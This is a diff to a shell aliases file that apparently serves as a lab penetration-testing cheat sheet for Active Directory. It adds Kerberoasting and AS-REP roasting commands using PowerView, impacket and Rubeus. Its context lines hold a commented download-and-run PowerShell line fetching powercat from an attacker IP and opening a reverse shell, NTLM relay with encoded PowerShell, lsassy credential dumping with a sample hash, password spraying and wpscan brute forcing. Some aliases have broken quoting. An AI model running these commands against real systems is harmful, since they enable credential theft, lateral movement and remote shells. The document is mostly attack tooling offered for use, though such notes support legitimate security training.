@@ -1,3 +1,4 @@
+#https://drive.google.com/file/d/1sLxTSGQImCxE8KbPi063OuH461ADzCR3/view?pli=1
 #$DOMAIN = hackn.lab or medtech.com
 #$DC = server01.hackn.lab or dc01.medtech.com
 # alias example='(){ echo Your arg was $1. ;}'
@@ -27,6 +28,9 @@ alias gedit='(){gedit "$1" &}'
 alias remove_neti='(){sudo ip link delete "$1"}'
 ##### PowerView ####
 alias powerview="echo Get-NetUser \n Get-NetComputer \n Get-DomainShare (-CheckShareAccess) \n Get-NetUser -SPN | select serviceprincipalname \n Get-NetGroup -AdminCount | select name,memberof,admincount,member | fl"
+alias powerview_getSPNtickets='echo Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local' # Get Kerberoast hash of user
+alias powerview_getallSPNtickets='echo Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv'
+\kerberoast.csv -NoTypeInformation # Powerview: Get all Kerberoast hashes
 #### WordPress ####
 alias wps='wpscan --url http://"$RHOST"/wp/wp-login.php --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads=50'
 #### RPC ####
@@ -34,7 +38,7 @@ alias rpcclient='(){rpcclient -U "" $RHOST "$@"}' # -queryusergroups <RID>,-quer
 #### SMB ####
 #enum4linux -a $ip
 alias crackmapexec_spray='crackmapexec smb $RHOSTS'
-alias crackmapexec_auto='echo "crackmapexec smb 192.168.200.75 -u "USERNAME" -p "$PASSWORD" -d corp.com --continue-on-success";echo "or --shares"' # can pass user/passw lists # <- to get shares
+alias crackmapexec_auto='echo "crackmapexec smb 192.168.200.75 -u "USERNAME" -p "$PASSWORD" -d corp.com --continue-on-success";echo "or --shares"' # can pass user/passw lists # <- to get shares # -p OR -H Hash
 alias crackmapexec_checkNull='crackmpackexec smb "$RHOST" -u "" -p "" --users' #powerfull
 # proxychains smbclient \\\\172.16.240.83\\Windows -U 'medtech.com\joe'
 #### DNS ####
@@ -59,6 +63,8 @@ alias imp-psexec='impacket-psexec -hashes 00000000000000000000000000000000:"$1" 
 alias imp-wmiexec='impacket-wmiexec -hashes 00000000000000000000000000000000:"$1" "$username"@"$ip"' # $1 = NT Hash
 alias imp-ntlmrelayx='impacket-ntlmrelayx --no-http-server -smb2support -t "$ip" -c "powershell -enc JABjAGwAaQBlAG5...."' #dir \\192.168.119.2\test -> on tgt machine to catch hash
 alias imp-mssqlclient='impacket-mssqlclient "$username":"$1"@"$ip" -windows-auth' # $1 = share name
+alias imp-GetUserSPNs='impacket-GetUserSPNs -request -dc-ip $RHOST <full domain>/$USERNAME:$PASSWORD #Kerberoasting
+#alias imp-GetUserSPNs='impacket-GetUserSPNs -no-preauth "<asrep_user>" -usersfile "<userlist.txt>" -dc-host "$RHOST" "$DOMAIN"/ #Kerberoasting
 #alias mysql= -u root -p 'root' -h 192.168.50.16 -P 3306
 #alias powershell_oneliner='(){powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$ip:8000/powercat.ps1');
 #powercat -c 192.168.45.245 -p 4444 -e powershell"
@@ -91,8 +97,16 @@ alias lsassy_domain_creds_txt='lsassy -d hackn.lab -u $username -p $password ser
 alias lsassy_pth='lsassy -d hackn.lab -u jsnow -H aad3b435b51404eeaad3b435b51404ee:38046f6aa4f7283f9a6b7e1575452109 server01.hackn.lab'
 # LM:NT OR # lsassy -d hackn.lab -u jsnow -H 38046f6aa4f7283f9a6b7e1575452109 server01.hackn.lab
 # aad3b435b51404eeaad3b435b51404ee
-#### Get Hashes ####
-alias getnpusers='(){python3 GetNPUsers.py test.local/ -dc-ip "$1" -usersfile usernames.txt -format hashcat -outputfile getnpusers_hashes.txt}'
+
+#### AS-REP ROAST ### Found username ## Get Hashes ##
+# ls /usr/share/doc/python3-impacket/examples
+alias getnpusers='(){python3 GetNPUsers.py htb.local/ -usersfile user.txt -format hashcat -outputfile hashes.domain.txt}'
+#alias getnpusers='(){python3 GetNPUsers.py test.local/ -dc-ip "$1" -usersfile usernames.txt -format hashcat -outputfile getnpusers_hashes.txt}'
+#### Kerberoasting #####
+alias rubeus_kerberoast='echo Rubeus.exe kerberoast' 
+alias rubeus_kerberoast='echo .\Rubeus.exe kerberoast /outfile:hashes.kerberoast'
+alias rubeus_kerberoast_user='echo .\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
+alias rubeus_kerberoast_admin='echo.\Rubeus.exe kerberoast /ldapfilter:"admincount=1" /nowrap' #Get of admins
 #### Found Hash #######
 alias smbhashlogin='smbclient \\\\$ip\\secrets -U Administrator --pw-nt-hash $HASH' # $HASH = nt hash
 #smbclient //server/share --directory path/to/directory -c 'get file.txt'
